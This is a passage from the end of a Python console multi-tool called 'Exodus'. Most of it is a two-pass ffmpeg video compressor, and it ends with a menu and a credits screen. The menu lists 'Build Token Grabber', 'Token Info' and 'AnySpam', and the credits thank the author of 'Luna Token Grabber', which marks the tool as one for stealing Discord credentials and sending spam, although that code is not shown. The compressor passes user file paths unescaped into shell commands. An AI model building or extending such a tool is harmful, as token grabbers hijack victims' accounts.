                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=-1:720 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=-1:720 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 96k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 96k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 91:
            bitrate -= 64
            if height >= 720:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:720 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:720 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 121:
            bitrate -= 64
            if height >= 480:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:480 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:480 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 181:
            bitrate -= 48
            if height >= 480:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:480 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:480 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 48k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 48k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 301:
            bitrate -= 32
            if height >= 320:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:320 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:320 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 32k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 32k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 421:
            bitrate -= 24
            if height >= 240:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:240 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:240 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 24k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 24k \"{script_folder}Compress\\{output_video}.webm\"")
        else:
            bitrate -= 12
            if height >= 144:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:144 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:144 -b:v {bitrate}k -pass 2 -c:a libopus -ac 1 -b:a 12k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -ac 1 -b:a 12k \"{script_folder}Compress\\{output_video}.webm\"")
    else:
        if duration < 31:
            bitrate -= 128
            if width >= 1080:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=1080:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=1080:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 128k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 128k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 61:
            bitrate -= 96
            if width >= 720:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=720:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=720:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 96k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 96k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 91:
            bitrate -= 64
            if width >= 720:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=720:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=720:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 121:
            bitrate -= 64
            if width >= 480:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=480:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=480:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 181:
            bitrate -= 48
            if width >= 480:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=480:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=480:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 48k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 48k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 301:
            bitrate -= 32
            if width >= 320:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=320:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=320:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 32k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 32k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 421:
            bitrate -= 24
            if width >= 240:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=240:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=240:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 24k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 24k \"{script_folder}Compress\\{output_video}.webm\"")
        else:
            bitrate -= 12
            if width >= 144:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=144:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=144:-1 -b:v {bitrate}k -pass 2 -c:a libopus -ac 1 -b:a 12k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -ac 1 -b:a 12k \"{script_folder}Compress\\{output_video}.webm\"")
    
    if path.isfile("temp.json") == True:
        remove("temp.json")
    if path.isfile("ffmpeg2pass-0.log") == True:
        remove("ffmpeg2pass-0.log")
        cls()
        p(V12(TripleColor((M1, m)), (O5)))
    
    recompress = i(f" {m}[{r}*{m}] Deseas recomprimir el archivo? {w}[y/n]: {r}> {w}")
    if recompress == "y" or recompress == "Y":
        system(f"ffmpeg -fflags +genpts -hide_banner -loglevel warning -stats -i \"{input_video}\" -r 24 \"{script_folder}Compress\\ReCompress-{output_video}.mp4")
        i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")

def Credits():
    cls()
    slow(f"""{mc}
    Credits to billy for some amounts of pystyle
    Credits to Smug246 for Luna Token Grabber

    Creditos a billy por algunos importes de pystyle
    Creditos a Smug246 por Luna Token Grabber
{w}
    Press enter for exit...""")
    i()
    exit()

class Exodus:
    StatusConnection()
    while True:
        T1(f"Exodus  ^|  Welcome: {OX}")
        cls()
        B1 = fr"""
             ▄▀▀█▄▄▄▄  ▄▀▀▄  ▄▀▄  ▄▀▀▀▀▄   ▄▀▀█▄▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▀▀▄ 
            ▐  ▄▀   ▐ █    █   █ █      █ █ ▄▀   █ █   █    █ █ █   ▐ 
              █▄▄▄▄▄  ▐     ▀▄▀  █      █ ▐ █    █ ▐  █    █     ▀▄   
              █    ▌       ▄▀ █  ▀▄    ▄▀   █    █   █    █   ▀▄   █  
             ▄▀▄▄▄▄       █  ▄▀    ▀▀▀▀    ▄▀▄▄▄▄▀    ▀▄▄▄▄▀   █▀▀▀   
             █    ▐     ▄▀  ▄▀            █     ▐              ▐      
             ▐         █    ▐             ▐                                                           
            ╭─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╮
              [1] MSN                   [7] Credits
              [2] Build Token Grabber      
              [3] Discord Invite                 
              [4] Token Info                
              [5] AnySpam           
              [6] Video Compressor                              [0] Exit 
            ╰─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╯                   
            """[1:]
        p(V12(TripleColor((M1, m)), (B1)))
        p()
        CH1 = i(f" {m}[{r}*{m}] Choice {r}> {w}")
        if CH1 == '1':
            MSN()
        if CH1 == '2':
            BDTG()
        if CH1 == '3':
            DiscordInvite()
        if CH1 == '4':
            DTI()
        if CH1 == '5':
            AnySpam()
        if CH1 == '6':
            XCSS()
        if CH1 == '7':
            Credits()
        if CH1 == '0':
            exit()
